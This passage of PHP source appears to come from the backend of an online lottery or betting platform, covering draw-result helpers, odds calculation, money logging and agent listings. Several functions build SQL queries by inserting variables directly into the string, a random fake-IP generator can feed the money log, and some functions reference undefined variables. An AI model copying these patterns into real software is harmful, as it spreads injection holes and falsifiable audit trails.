        $a += $v;
    }
    if ($a % 2 == 0) {
        $c = 1;
    }
    return [$a, $b, $c, $d];
}

function lh($expect)
{
    $expect2 = array_reverse($expect);
    $array = [];
    foreach ($expect as $k => $v) {
        if ($expect[$k] > $expect2[$k]) {
            $array[] = 1;
        } else {
            $array[] = 0;
        }
    }
    return array_slice($array, 5);
}

function hs($expect)
{
    $array = [];
    foreach ($expect as $v) {
        $ge = $v % 10;
        $array[] = ($v - $ge) / 10 + $ge;
    }
    return $array;
}

function shengxiaos($ma)
{
    $bml = '壬寅';
    // echo $bml;die;
    $jiazhi = array('甲子', '乙丑', '丙寅', '丁卯', '戊辰', '己巳', '庚午', '辛未', '壬申', '癸酉', '甲戌', '乙亥', '丙子', '丁丑', '戊寅', '己卯', '庚辰', '辛巳', '壬午', '癸未', '甲申', '乙酉', '丙戌', '丁亥', '戊子', '己丑', '庚寅', '辛卯', '壬辰', '癸巳', '甲午', '乙未', '丙申', '丁酉', '戊戌', '己亥', '庚子', '辛丑', '壬寅', '癸卯', '甲辰', '乙巳', '丙午', '丁未', '戊申', '己酉', '庚戌', '辛亥', '壬子', '癸丑', '甲寅', '乙卯', '丙辰', '丁巳', '戊午', '己未', '庚申', '辛酉', '壬戌', '癸亥');
    $index = 0;
    foreach ($jiazhi as $key => $val) {
        if ($val == $bml) {
            $index = $key;
            break;
        }
    }
    $index = $index % 12 + 1;
    $ma = $ma % 12;
    $arr = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11');
    $in = 0;
    if ($index >= $ma) {
        $in = $index - $ma;
    } else {
        $in =  $index - $ma + 12;
    }
    if ($in >= 12) $in -= 12;
    return $arr[$in];
}

// "虎", "龙","和"
function longhu($v1, $v2)
{
    if ($v2 == '') return '';
    if ($v1 == $v2) {
        return 2;
    } else if ($v1 < $v2) {
        return 0;
    } else {
        return 1;
    }
}

function qita($v1, $v2, $v3)
{
    if ($v3 == '') return '';
    $v = 9;
    if (baozhi($v1, $v2, $v3) == 1) $v = 0;
    else if (shunzhi($v1, $v2, $v3) == 1) $v = 1;
    else if (duizhi($v1, $v2, $v3) == 1) $v = 2;
    else if (banshun($v1, $v2, $v3) == 1) $v = 3;
    else $v = 4;
    $arr = array("豹子", "顺子", "对子", "半顺", "杂六");
    return $arr[$v];
}

function duizhi($v1, $v2, $v3)
{
    if ($v1 == $v2 | $v1 == $v3 | $v2 == $v3) {
        $v = 1;
    } else {
        $v = 0;
    }
    if ($v == 1) {
        $vv = baozhi($v1, $v2, $v3);
        if ($vv == 1) {
            $v = 0;
        }
    }
    return $v;
}
function baozhi($v1, $v2, $v3)
{
    if ($v1 == $v2 & $v1 == $v3 & $v2 == $v3) {
        $v = 1;
    } else {
        $v = 0;
    }
    return $v;
}
function shunzhi($v1, $v2, $v3)
{
    $vh = $v1 + $v2 + $v3;
    $v  = 0;
    if ($vh % 3 == 0 & $v1 != $v2 & $v1 != $v3 & $v2 != $v3 & max($v1, $v2, $v3) - min($v1, $v2, $v3) == 2) {
        $v = 1;
    } else {
        if (strpos('[019]', $v1) != false & strpos('[019]', $v2) != false & strpos('[019]', $v3) != false & $v1 != $v2 & $v1 != $v3 & $v2 != $v3) {
            if ($v1 != $v2 & $v1 != $v3 & $v2 != $v3) {
                $v = 1;
            }
        } else {
            if (strpos('[890]', $v1) != false & strpos('[890]', $v2) != false & strpos('[890]', $v3) != false & $v1 != $v2 & $v1 != $v3 & $v2 != $v3) {
                if ($v1 != $v2 & $v1 != $v3 & $v2 != $v3) {
                    $v = 1;
                }
            }
        }
    }
    return $v;
}


function banshun($v1, $v2, $v3)
{
    $vh1 = abs($v1 - $v2);
    $vh2 = abs($v1 - $v3);
    $vh3 = abs($v2 - $v3);
    if (baozhi($v1, $v2, $v3) == 1) {
        $z = 0;
    } else {
        if (shunzhi($v1, $v2, $v3) == 1) {
            $z = 0;
        } else {
            if (duizhi($v1, $v2, $v3) == 1) {
                $z = 0;
            } else {
                if ($vh1 == 1 | $vh2 == 1 | $vh3 == 1) {
                    $z = 1;
                } else {
                    if (strpos('[' . $v1 . $v2 . $v3 . ']', '0') != false & strpos('[' . $v1 . $v2 . $v3 . ']', '9') != false) {
                        $z = 1;
                    } else {
                        $z = 0;
                    }
                }
            }
        }
    }
    return $z;
}
function zaliu($v1, $v2, $v3)
{
    if (baozhi($v1, $v2, $v3) == 1) {
        $z = 0;
    } else {
        if (shunzhi($v1, $v2, $v3) == 1) {
            $z = 0;
        } else {
            if (duizhi($v1, $v2, $v3) == 1) {
                $z = 0;
            } else {
                if (banshun($v1, $v2, $v3) == 1) {
                    $z = 0;
                } else {
                    $z = 1;
                }
            }
        }
    }
    return $z;
}

function zhdx($gid, $v)
{
    if ($v == '') return '';
    if ($gid == 101) {
        if ($v <= 22)
            return "小";
        else
            return "大";
    } else if ($gid == 163) {
        if ($v <= 13)
            return "小";
        else
            return "大";
    } else if ($gid == 121) {
        if ($v < 30)
            return "小";
        else if ($v > 30)
            return "大";
        else
            return "和";
    } else if ($gid == 103) {
        if ($v < 84)
            return "小";
        else if ($v > 84)
            return "大";
        else
            return "和";
    } else if ($gid == 151) {
        if ($v <= 10)
            return "小";
        else
            return "大";
    } else if ($gid == 161) {
        if ($v < 810)
            return "小";
        else if ($v > 810)
            return "大";
        else
            return "和";
    } else if ($gid == 107) {
        if ($v <= 11)
            return "小";
        else
            return "大";
    } else if ($gid == 100) {
        if ($v <= 174)
            return "小";
        else
            return "大";
    }
}


function week()
{
    $config = db('config')->find();
    $start = str_replace(':', '', $config['editstart']);
    $zuo = 0;
    if (date("His") < $start) $zuo = 1;
    $getWeekDay = date("w");
    if ($getWeekDay == 0) {
        $sdate = array(
            0 => date("Y-m-d", mktime(0, 0, 0, date('m'), date('d') - 1, date('Y'))),
            1 => date('Y-m-d', mktime(0, 0, 0, date('n'), 1, date('Y'))),
            2 => date('Y-m-d', mktime(0, 0, 0, date('n'), date('t'), date('Y'))),
            3 => date('Y-m-01', strtotime('last month')),
            4 => date('Y-m-t', strtotime('last month')),
            5 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1 - 7, date("Y"))),
            6 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7 - 7, date("Y"))),
            7 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1 - 7 - 7, date("Y"))),
            8 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7 - 7 - 7, date("Y"))),
            9 => date("Y-m-d", mktime(0, 0, 0, date('m') - 1, date('d') - 4, date('Y'))),
            10 => date("Y-m-d")
        );
    } else if ($getWeekDay == 1 && $zuo == 1) {
        $sdate = array(
            0 => date("Y-m-d", mktime(0, 0, 0, date('m'), date('d') - 1, date('Y'))),
            1 => date('Y-m-d', mktime(0, 0, 0, date('n'), 1, date('Y'))),
            2 => date('Y-m-d', mktime(0, 0, 0, date('n'), date('t'), date('Y'))),
            3 => date('Y-m-01', strtotime('last month')),
            4 => date('Y-m-t', strtotime('last month')),
            5 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1 - 7, date("Y"))),
            6 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7 - 7, date("Y"))),
            7 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1 - 7 - 7, date("Y"))),
            8 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7 - 7 - 7, date("Y"))),
            9 => date("Y-m-d", mktime(0, 0, 0, date('m') - 1, date('d') - 4, date('Y'))),
            10 => date("Y-m-d")
        );
    } else {
        $sdate = array(
            0 => date("Y-m-d", mktime(0, 0, 0, date('m'), date('d') - 1, date('Y'))),
            1 => date('Y-m-d', mktime(0, 0, 0, date('n'), 1, date('Y'))),
            2 => date('Y-m-d', mktime(0, 0, 0, date('n'), date('t'), date('Y'))),
            3 => date('Y-m-01', strtotime('last month')),
            4 => date('Y-m-t', strtotime('last month')),
            5 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1, date("Y"))),
            6 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7, date("Y"))),
            7 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 1 - 7, date("Y"))),
            8 => date("Y-m-d", mktime(0, 0, 0, date("m"), date("d") - $getWeekDay + 7 - 7, date("Y"))),
            9 => date("Y-m-d", mktime(0, 0, 0, date('m') - 1, date('d') - 4, date('Y'))),
            10 => date("Y-m-d")
        );
    }
    if ($zuo == 1) {
        $sdate[0] = date("Y-m-d", mktime(0, 0, 0, date('m'), date('d') - 2, date('Y')));
        $sdate[10] = date("Y-m-d", time() - 86400);
    }
    return $sdate;
}

function getthisdate()
{
    $config = db('config')->find();
    $his = date("His");
    if ($his < str_replace(':', '', $config['editstart'])) {
        $date = date("Y-m-d", time() - 86400);
    } else {
        $date = date("Y-m-d");
    }
    return $date;
}
function sqltime($v)
{
    return date("Y-m-d H:i:s", $v);
}
function sqldate($v)
{
    return date("Y-m-d", $v);
}
function rweek($v)
{
    switch ($v) {
        case 1:
            $v = '一';
            break;
        case 2:
            $v = '二';
            break;
        case 3:
            $v = '三';
            break;
        case 4:
            $v = '四';
            break;
        case 5:
            $v = '五';
            break;
        case 6:
            $v = '六';
            break;
        default:
            $v = '日';
            break;
    }
    return $v;
}

function getpsm($bid, $ab, $abcd, $cid)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $web = db('web')->find();
    if ($bid != '') {
        $play = db('play')->where('gid', $gid)->where('bid', $bid)->where('ifok', 1)->order('pid,bid,sid,xsort')->select();
    } else {
        $play = db('play')->where('gid', $gid)->where('ifok', 1)->order('pid,bid,sid,xsort')->select();
    }
    $p    = array();
    $abcd = strtolower($abcd);
    foreach ($play as $i => $value) {
        $class = db('class')->where('gid', $gid)->where('cid', $value['cid'])->find();
        $ftype           = $class['ftype'] ?? 0;
        $sclass = db('sclass')->where('gid', $gid)->where('sid', $value['sid'])->find();
        $p[$i]['ftype']  = $ftype;
        $p[$i]['dftype']  = $class['dftype'];
        $p[$i]['bid']    = $value['bid'];
        $p[$i]['sid']    = $value['sid'];
        $p[$i]['sname']  = $sclass['name'];
        $p[$i]['cid']    = $value['cid'];
        $p[$i]['cname']  = $class['name'];
        $p[$i]['pid']    = $value['pid'];
        $p[$i]['name']   = $value['name'];
        $p[$i]['ifok']   = $value['ifok'];
        $p[$i]['xsort']  = $value['xsort'];
        $p[$i]['znum1']    = $value['znum1'];
        $p[$i]['peilv1'] = (float) ($value['peilv1']);
        $p[$i]['peilv2'] = (float) $value['peilv2'];
        $p[$i]['mp1']    = (float) $value['mp1'];
        $p[$i]['mp2']    = (float) $value['mp2'];
        $p[$i]['cid']    = $value['cid'];
        $p[$i]['sid']    = $value['sid'];
        $p[$i]['bid']    = $value['bid'];
        $points = db('points')->where('gid', $gid)->where('userid', session('user_login_id'))->where('class', $ftype)->find();
        $p[$i]['minje'] = $points['minje'] ? $points['minje'] : 1;
        $p[$i]['maxje'] = $points['maxje'] ? $points['maxje'] : 2000;
        $patt = json_decode($game['patt' . $web['patt']], true);
        $pan = json_decode($game['pan'], true);
        if ($abcd == 'a') {
            $p[$i]['peilv1'] = (float) $value['peilv1'];
        } else {
            $p[$i]['peilv1'] = pr4((float) ($value['peilv1'] - $patt[$ftype][$abcd]));
        }
        if (isset($pan[$ftype]) && $pan[$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
            $p[$i]['peilv1'] += $patt[$ftype]['ab'];
        }
    }
    $p[0]['csid'] = count($play);
    $p[0]['ccid'] = count($play);
    return $p;
}
function getsm($bid, $ab, $abcd, $sid, $smtype)
{
    $tb_play         = "x_play";
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $web = db('web')->find();
    $fenlei = $game['fenlei'];
    if ($fenlei == 101) {
        $sql = "select * from `{$tb_play}` where gid='{$gid}' and (( bid=23378755 and  name in('单','双','大','小')) or name in('总和单','总和双','总和大','总和小','龙','虎','和') or  bid=23378767) order by bid,sid,cid,xsort ";
    } else {
        if ($fenlei == 103 | $fenlei == 121) {
            $sql = "select * from `{$tb_play}` where gid='{$gid}' and (name in('单','双','大','小','合数单','合数双','尾大','尾小','总和单','总和双','总和大','总和小','总和尾大','总和尾小','龙','虎'))  order by bid,sid,xsort";
        } else {
            if ($fenlei == 151) {
                $sql = "select * from `{$tb_play}` where gid='{$gid}'  order by bid,sid,cid,xsort";
            } else {
                if ($fenlei == 161) {
                    $sql = "select * from `{$tb_play}` where gid='{$gid}' and cid<> 23379261 and bid<> 26000000  order by id";
                } else {
                    if ($fenlei == 107) {
                        $sql = "select * from `{$tb_play}` where gid='{$gid}' and name in('单','双','大','小','龙','虎','冠亚单','冠亚双','冠亚大','冠亚小') order by bid,sid,xsort";
                    } else {
                        if ($fenlei == 163) {
                            $sql = "select * from `{$tb_play}` where gid='{$gid}' and ( name in('单','双','大','小') or bid='23378858') and bid!=23378857 order by bid,sid,xsort";
                        }
                    }
                }
            }
        }
    }
    $play = Db::query($sql);
    $p = array();
    $abcd = strtolower($abcd);
    $patt           = json_decode($game['patt' . $web['patt']], true);
    foreach ($play as $i => $value) {
        $p[$i]['name'] = $value['name'];
        $class = db('class')->where('gid', $gid)->where('cid', $value['cid'])->find();
        $ftype = $class['ftype'] ?? 0;
        $sclass = db('sclass')->where('gid', $gid)->where('sid', $value['sid'])->find();
        $bclass = db('bclass')->where('gid', $gid)->where('bid', $value['bid'])->find();
        $p[$i]['bname'] = $bclass['name'];
        $p[$i]['sname'] = $sclass['name'];
        $p[$i]['cname'] = $class['name'];
        $p[$i]['ftype'] = $ftype;
        $p[$i]['pid'] = $value['pid'];
        $p[$i]['ifok'] = $value['ifok'];
        $p[$i]['dftype'] = $class['dftype'];
        $p[$i]['cid'] = $value['cid'];
        $p[$i]['sid'] = $value['sid'];
        $p[$i]['bid'] = $value['bid'];
        $points = db('points')->where('gid', $gid)->where('userid', session('user_login_id'))->where('class', $ftype)->find();
        $p[$i]['minje'] = $points['minje'];
        $p[$i]['maxje'] = $points['maxje'];
        $patt = json_decode($game['patt' . $web['patt']], true);
        if ($abcd == 'a') {
            $p[$i]['peilv1'] = (float) $value['peilv1'];
        } else {
            $p[$i]['peilv1'] = (float) ($value['peilv1'] - $patt[$ftype][$abcd]);
        }
        $pan = json_decode($game['pan'], true);
        if (isset($pan[$ftype]) && $pan[$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
            $p[$i]['peilv1'] += $patt[$ftype]['ab'];
        }
    }
    return $p;
}
function getzlong()
{
    $tb_play         = "x_play";
    $tb_class         = "x_class";
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    if ($gid == 161 | $gid == 162) {
        $play = Db::query("select * from `{$tb_play}` where gid='{$gid}' and zqishu>=2 and cid in (select cid from `{$tb_class}` where gid='{$gid}' and ftype not in(1,2))  order by zqishu desc,bid,sid,cid,xsort");
    } else {
        $play = Db::query("select * from `{$tb_play}` where gid='{$gid}' and zqishu>=2 and name in('单','双','大','小','龙','虎','冠亚单','冠亚双','冠亚大','冠亚小','总和单','总和双','总和大','总和小','合数单','合数双','尾大','尾小') order by zqishu desc,bid,sid,cid,xsort");
    }
    $z = array();
    foreach ($play as $i => $value) {
        $class = db('class')->where('gid', $gid)->where('cid', $value['cid'])->find();
        $sclass = db('sclass')->where('gid', $gid)->where('sid', $value['sid'])->find();
        $bclass = db('bclass')->where('gid', $gid)->where('bid', $value['bid'])->find();
        $z[$i]['name'] = wf2($game["fenlei"], $bclass['name'], $sclass['name'], $class['name']);
        $z[$i]['pname'] = $value['name'];
        $z[$i]['bname'] = $bclass['name'];
        $z[$i]['qishu'] = $value['zqishu'];
    }
    return $z;
}
function wf2($g, $b, $s, $c)
{
    if ($b == "番摊") {
        return $c;
    } else if ($g == 100 || $g == 200) {
        if ($s == '過關')
            return $b;
        else
            return $s;
    } else if (($g == 101 | $g == 163) && $s != '番摊') {
        switch ($b) {
            case "1~5":
            case "1~3":
                return $s;
                break;
            case "1字组合":
                return $c;
                break;
            case "2字和数":
                return $s;
                break;
            case "2字组合":
                return $p;
                break;
            case "2字定位":
                return $p;
                break;
            case "3字组合":
                return $p;
                break;
            case "3字定位":
                return $p;
                break;
            case "3字和数":
                if ($c == '尾数')
                    return $s . '-' . $c;
                else
                    return $s;
                break;
            case "总和龙虎":
                if ($c == '总和尾数' | $c == '总和数')
                    return $s . '-' . $c;
                else
                    return $s;
                break;
            case "牛牛梭哈":
                return $c;
                break;
            case "跨度":
                return $c;
                break;
            case "前中后三":
            case "前三":
                return $s . '-' . $c;
                break;
        }
    } else {
        return $b;
    }
}
function getpaiming($bid, $ab, $abcd, $stype)
{
    $tb_play         = "x_play";
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $web = db('web')->find();
    if ($stype == 15) {
        $sql = "select * from `{$tb_play}` where gid='{$gid}' and ztype=0 and bid in (23378800,23378803,23378807,23378809,23378812)";
    } else {
        if ($stype == 110) {
            $sql = "select * from `{$tb_play}` where gid='{$gid}' and ztype=0 and bid in (23378800,23378803,23378807,23378809,23378812,23378813,23378816,23378819,23378821,23378823)";
        } else {
            if ($stype == 610) {
                $sql = "select * from `{$tb_play}` where gid='{$gid}' and ztype=0 and bid in (23378813,23378816,23378819,23378821,23378823)";
            } else {
                if ($stype == 105) {
                    $sql = "select * from `{$tb_play}` where gid='{$gid}' and ztype=0 and bid!=23378798 ";
                } else {
                    if ($stype == 108) {
                        $sql = "select * from `{$tb_play}` where gid='{$gid}' and ztype=0 and bid!=23378785 ";
                    }
                }
            }
        }
    }
    $play = Db::query($sql);
    $p = array();
    $abcd = strtolower($abcd);
    foreach ($play as $i => $value) {
        $p[$i]['name'] = $value['name'];
        $class = db('class')->where('gid', $gid)->where('cid', $value['cid'])->find();
        $ftype = $class['ftype'];
        $sclass = db('sclass')->where('gid', $gid)->where('sid', $value['sid'])->find();
        $bclass = db('bclass')->where('gid', $gid)->where('bid', $value['bid'])->find();
        $p[$i]['bname'] = $bclass['name'];
        $p[$i]['sname'] = $sclass['name'];
        $p[$i]['cname'] = $class['name'];
        $p[$i]['ftype'] = $ftype;
        $p[$i]['pid'] = $value['pid'];
        $p[$i]['ifok'] = $value['ifok'];
        $p[$i]['dftype'] = $class['dftype'];
        $p[$i]['cid'] = $value['cid'];
        $p[$i]['sid'] = $value['sid'];
        $p[$i]['bid'] = $value['bid'];
        $points = db('points')->where('gid', $gid)->where('userid', session('user_login_id'))->where('class', $ftype)->find();
        $p[$i]['minje'] = $points['minje'];
        $p[$i]['maxje'] = $points['maxje'];
        $patt = json_decode($game['patt' . $web['patt']], true);
        $pan = json_decode($game['pan'], true);
        if ($abcd == 'a') {
            $p[$i]['peilv1'] = (float) $value['peilv1'];
        } else {
            $p[$i]['peilv1'] = (float) ($value['peilv1'] - $patt[$ftype][$abcd]);
        }
        if (isset($pan[$ftype]) && $pan[$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
            $p[$i]['peilv1'] += $patt[$ftype]['ab'];
        }
    }
    return $p;
}
function getpsmd($bid, $ab, $abcd, $cid, $sid)
{
    $gid = session('gid');
    $game = db('game')->where('gid', $gid)->find();
    $web = db('web')->find();
    $time = time();
    if ($sid != '' && $bid != '') {
        $play = db('play')->where('gid', $gid)->where('bid', $bid)->where('sid', $sid)->where('ifok', 1)->order('bid,xsort')->select();
    } else if ($sid != '') {
        $play = db('play')->where('gid', $gid)->where('sid', $sid)->where('ifok', 1)->order('bid,xsort')->select();
    } else {
        $play = db('play')->where('gid', $gid)->where('bid', $bid)->where('ifok', 1)->order('sid,xsort')->select();
    }
    $p    = array();
    $abcd = strtolower($abcd);
    foreach ($play as $i => $value) {
        $class = db('class')->where('gid', $gid)->where('cid', $value['cid'])->find();
        $ftype           = $class['ftype'];
        $sclass = db('sclass')->where('gid', $gid)->where('sid', $value['sid'])->find();
        $p[$i]['ftype']  = $ftype;
        $p[$i]['dftype']  = $class['dftype'];
        $p[$i]['bid']    = $value['bid'];
        $p[$i]['sid']    = $value['sid'];
        $p[$i]['sname']  = $sclass['name'];
        $p[$i]['cid']    = $value['cid'];
        $p[$i]['cname']  = $class['name'];
        $p[$i]['pid']    = $value['pid'];
        $p[$i]['ifok']   = $value['ifok'];
        $p[$i]['name']   = $value['name'];
        $p[$i]['xsort']  = $value['xsort'];
        $points = db('points')->where('gid', $gid)->where('userid', session('user_login_id'))->where('class', $ftype)->find();
        $p[$i]['minje'] = $points['minje'];
        $p[$i]['maxje'] = $points['maxje'];
        $patt = json_decode($game['patt' . $web['patt']], true);
        $p[$i]['peilv1'] = (float) ($value['peilv1'] - $patt[$ftype][$abcd]);
        $pan = json_decode($game['pan'], true);
        if (isset($pan[$ftype]) && $pan[$ftype]['ab'] == 1 & ($ab == 'B' | $ab == 'b')) {
            $p[$i]['peilv1'] += $patt[$ftype]['ab'];
        }
        $p[$i]['peilv2'] = (float) $value['peilv2'];
        $p[$i]['mp1']    = (float) $value['mp1'];
        $p[$i]['mp2']    = $value['mp2'];
        $p[$i]['cid']    = $value['cid'];
        $p[$i]['sid']    = $value['sid'];
        $p[$i]['bid']    = $value['bid'];
    }
    $p[0]['csid'] = count($play);
    $p[0]['ccid'] = count($play);
    return $p;
}
function setuptid()
{
    $lib = db('lib')->where('userid', session('user_login_id'))->order('id desc')->find();
    if (!$lib) {
        return '20000000';
    }
    return (int)$lib['tid'] + rand(1, 3);
}
function usermoneylog($uid, $money, $usermoney, $action, $type = 1, $ips = '')
{
    if ($ips == '' | $ips == null) $ip   = request()->ip();
    else $ip = $ips;
    if ($uid == 99999999) {
        db('money_log')->insert(['ip' => $ip, 'time' => Db::raw('now()'), 'bz' => $action, 'userid' => $uid, 'money' => $money, 'usermoney' => $usermoney, 'type' => $type, 'modiuser' => $uid, 'modisonuser' => $uid]);
    } else {
        db('money_log')->insert(['ip' => $ip, 'time' => Db::raw('now()'), 'bz' => $action, 'userid' => $uid, 'money' => $money, 'usermoney' => $usermoney, 'type' => $type, 'modiuser' => $uid, 'modisonuser' => 0]);
    }
    return true;
}
function getbh()
{
    $bclass = db('bclass')->where('gid', session('gid'))->where('ifok', 1)->order('xsort')->select();
    $b = array();
    foreach ($bclass as $i => $value) {
        $b[$i]['bid']  = $value['bid'];
        $b[$i]['name'] = $value['name'];
        $b[$i]['i']    = $i;
    }
    return $b;
}
function getdatearr($v1, $v2, $thisday, $tb)
{

    $arr = [];
    $start = strtotime($v1);
    if (strpos($tb, str_replace('-', '', $v1)) !== false || $v1 == $thisday) {
        $arr[] = $v1;
    }

    while (1) {
        if (date("Y-m-d", $start) >= $thisday) {
            break;
        }
        if (date("Y-m-d", $start) >= $v2) {
            break;
        }
        $start += 86400;
        $d = date("Y-m-d", $start);
        if (strpos($tb, str_replace('-', '', $d)) !== false || $d == $thisday) {
            $arr[] = $d;
        }
    }
    return $arr;
}
function topuser($uid)
{
    if ($uid != 99999999) {
        $web = db('web')->find();
        $layer = json_decode($web['layer'], true);
    }
    $user = [];
    $userList = db('user')->where('fid', $uid)->where('ifson', 0)->select();
    foreach ($userList as $i => $value) {
        $user[$i]['userid'] = $value['userid'];
        if ($uid != 99999999) {
            if ($value['ifagent'] == 0) {
                $user[$i]['username'] = $value['username'] . '(' . $value['name'] . '][会员]';
                $user[$i]['layername'] = "会员";
            } else {
                $user[$i]['username'] = $value['username'] . '(' . $value['name'] . '][' . trim($config['layer'][$value['layer'] - 1]) . ']';
                $user[$i]['layername'] = $config['layer'][$value['layer'] - 1];
            }
        } else {
            $user[$i]['username'] = $value['username'] . '(' . $value['name'] . '][公司]';
            $user[$i]['layername'] = "一级代理";
        }
        $user[$i]['user'] = $value['username'];
        $user[$i]['name'] = $value['name'];
        $user[$i]['money'] = pr1($value['kmoney'] + $value['money']);
        $user[$i]['layer']   = $value['layer'];
        $user[$i]['ifagent'] = $value['ifagent'];
        $user[$i]['wid']     = $value['wid'];
        $user[$i]['upje'] = 0;
        $user[$i]['zje'] = 0;
        $user[$i]['uje'] = 0;
        $user[$i]['zs'] = 0;
        $user[$i]['shui'] = 0;
        $user[$i]['zhong'] = 0;
        $user[$i]['yk'] = 0;
        $user[$i]['uyk'] = 0;
        $user[$i]['ushui'] = 0;
        $user[$i]['uzhong'] = 0;
        $user[$i]['meshui'] = 0;
        $user[$i]['mezhong'] = 0;
        $user[$i]['meyk'] = 0;
        $user[$i]['sendshui'] = 0;
        $user[$i]['sendzhong'] = 0;
        $user[$i]['sendyk'] = 0;
    }
    return $user;
}
function Rand_IP()
{
    $ip2id = round(rand(600000, 2550000) / 10000);
    $ip3id = round(rand(600000, 2550000) / 10000);
    $ip4id = round(rand(600000, 2550000) / 10000);
    $arr_1 = array("218", "218", "66", "66", "218", "218", "60", "60", "202", "204", "66", "66", "66", "59", "61", "60", "222", "221", "66", "59", "60", "60", "66", "218", "218", "62", "63", "64", "66", "66", "122", "211");
    $randarr = mt_rand(0, count($arr_1) - 1);
    $ip1id = $arr_1[$randarr];
    return $ip1id . "." . $ip2id . "." . $ip3id . "." . $ip4id;
}
function transgame($gid, $field)
{
    $game = Db::query("select * from `x_game` where gid='$gid'");
    return $game[0][$field];
}
function transuser($uid, $cols)
{
    $user = Db::query("select * from `x_user` where userid='$uid'");
    return $user[0][$cols];
}
function getb8h($gid)
{
    $bclass = Db::query("select * from `x_bclass` where gid='$gid' and ifok=1 order by xsort");
    $b = array();
    foreach ($bclass as $i => $value) {
        $b[$i]['bid']  = $value['bid'];
        $b[$i]['name'] = $value['name'];
        $b[$i]['i']    = $i;
    }
    return $b;
}
function getb8($gid)
{
    $fenlei = transgame($gid, 'fenlei');
    if ($fenlei == 107) {
        $b[0]['bid'] = 0;
        $b[0]['i'] = 0;
        $b[0]['name'] = '冠、亚军组合';
        $b[1]['bid'] = 1;
        $b[1]['i'] = 1;
        $b[1]['name'] = '三、四、五、六名';
        $b[2]['bid'] = 2;
        $b[2]['i'] = 2;
        $b[2]['name'] = '七、八、九、十名';
        if ($config['cs']['ft'] == 1) {
            $b[3]['bid'] = 3;
            $b[3]['i'] = 3;
            $b[3]['name'] = '番摊';
        }
        if ($config['pk10niu'] == 1) {
            $b[4]['bid'] = 4;
            $b[4]['i'] = 4;
            $b[4]['name'] = '任选牛牛';
        }
    } else {
        $bclass = Db::query("select * from `x_bclass` where gid='$gid' and ifok=1 order by xsort");
        $b = array();
        foreach ($bclass as $i => $value) {
            $b[$i]['bid']  = $value['bid'];
            $b[$i]['name'] = $value['name'];
            $b[$i]['i']    = $i;
        }
    }
    return $b;
}

function kds($gid, $v)
{
    if ($v == '') return '';
    if (($gid == 121 | $gid == 123 | $gid == 125) & $v == 11) {
        return "和";
    } else if (($gid == 161 | $gid == 162) & $v == 810) {
        return "和";
    } else if ($v % 2 == 0)
        return "双";
    else {
        return "单";
    }
}
function kzhdx($gid, $v)
{
    if ($v == '') return '';
    if ($gid == 101) {
        if ($v <= 22)
            return "小";
        else
            return "大";
    } else if ($gid == 163) {
        if ($v <= 13)
            return "小";
        else
            return "大";
    } else if ($gid == 121) {
        if ($v < 30)
            return "小";
        else if ($v > 30)
            return "大";
        else
            return "和";
    } else if ($gid == 103) {
        if ($v < 84)
            return "小";
        else if ($v > 84)
            return "大";
        else
            return "和";
    } else if ($gid == 151) {
        if ($v <= 10)
            return "小";
        else
            return "大";
    } else if ($gid == 161) {
        if ($v < 810)
            return "小";
        else if ($v > 810)
            return "大";
        else
            return "和";
    } else if ($gid == 107) {
        if ($v <= 11)
            return "小";
        else
            return "大";
    } else if ($gid == 100) {
        if ($v <= 174)
            return "小";
        else
            return "大";
    }
}

function kdx($gid, $v)
{
    if ($v == '') return '';
    if ($gid == 101) {
        if ($v <= 4)
            return "小";
        else
            return "大";
    } else if ($gid == 121) {
        if ($v < 6)
            return "小";
        else if ($v < 10)
            return "大";
        else
            return "和";
    } else if ($gid == 103) {
        if ($v < 11)
            return "小";
        return "大";
    } else if ($gid == 151) {
        if ($v <= 3)
            return "小";
        else
            return "大";
    } else if ($gid == 161) {
        if ($v < 41)
            return "小";
        else
            return "大";
    } else if ($gid == 107) {
        if ($v <= 5)
            return "小";
        else
            return "大";
    } else if ($gid == 100) {
        if ($v < 25)
            return "小";
        else if ($v <= 49)
            return "大";
        //else return "和";
    }
}
function kwdx($v)
{
    if ($v == '') return '尾小';
    $v = $v % 10;
    if ($v <= 4)
        return "尾小";
    else
        return "尾大";
}
function kzh($v)
{
    if ($v == '') return '';
    $zhi = array(
        1,
        2,
        3,
        5,
        7
    );
    if (in_array($v, $zhi)) {
        return "质";
    } else {
        return "合";
    }
}
function khs($v)
{
    if ($v == '') return '';
    $ge = $v % 10;
    $hs = ($v - $ge) / 10 + $ge;
    return $hs;
}
function klonghu($v1, $v2)
{
    if ($v2 == '') return '';
    if ($v1 == $v2) {
        return "和";
    } else if ($v1 < $v2) {
        return "虎";
    } else {
        return "龙";
    }
}
function getftzh($kj, $cs)
{

    if ($cs['ftmode'] == 1) {
        $ftm = explode(',', $cs['ftnum']);
        $ft = '';
        foreach ($ftm as $k => $v) {
            $ft .= $kj[$v - 1];
        }
    } else {
        $ft = 0;
        $ftm = explode(',', $cs['ftnum']);
        foreach ($ftm as $k => $v) {
            $ft += $kj[$v - 1];
        }
    }
    return  $ft;
}
function checkfid($uid)
{
    $tb_user = 'x_user';
    $userid = CHECK_ID;
    if ($userid == 99999999)
        return true;
    if ($uid == $userid)
        return false;
    if (transuser($userid, 'status') == 0)
        return false;
    $layer  = transuser($userid, 'layer');
